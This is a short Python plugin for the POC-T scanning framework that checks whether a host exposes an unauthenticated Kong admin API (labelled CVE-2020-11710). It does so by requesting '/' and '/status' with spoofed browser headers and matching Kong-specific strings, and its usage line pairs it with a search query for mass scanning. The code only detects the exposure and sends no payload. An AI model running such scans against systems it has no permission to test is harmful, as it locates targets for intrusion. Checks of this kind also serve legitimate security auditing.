#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
python POC-T.py -s kong-cve-2020-11710-unauth -aF "app=Kong"

"""

import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#
def format_url(xstr):
    xstr = str(xstr)
    if "//" not in xstr:
        xstr = "https://" + xstr
    return xstr


def get_and_detect_resp(url, path='/', code=200, xstr=''):
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close"}
    try:
        url = url.rstrip('/')
        burp0_url = url + path
        r = requests.get(burp0_url, headers=burp0_headers)
        if int(code) == r.status_code and xstr in r.text:
            return True
        else:
            return False
    except:
        return False


def poc(url):
    url = format_url(url)
    r1 = "/"
    r2 = "/status"
    if get_and_detect_resp(url, r1, 200, "kong_env") and get_and_detect_resp(url, r2, 200, "kong_db_cache_miss"):
        return url
    else:
        return False
